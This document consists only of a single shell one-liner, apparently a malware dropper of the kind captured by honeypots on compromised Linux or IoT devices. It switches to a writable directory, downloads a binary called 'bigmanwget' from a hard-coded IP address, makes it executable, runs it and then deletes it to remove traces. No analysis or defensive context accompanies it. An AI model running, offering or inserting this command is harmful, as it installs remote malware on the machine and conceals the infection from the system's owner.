cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.141.202/bigmanwget; chmod +x bigmanwget; ./bigmanwget; rm -rf bigmanwget
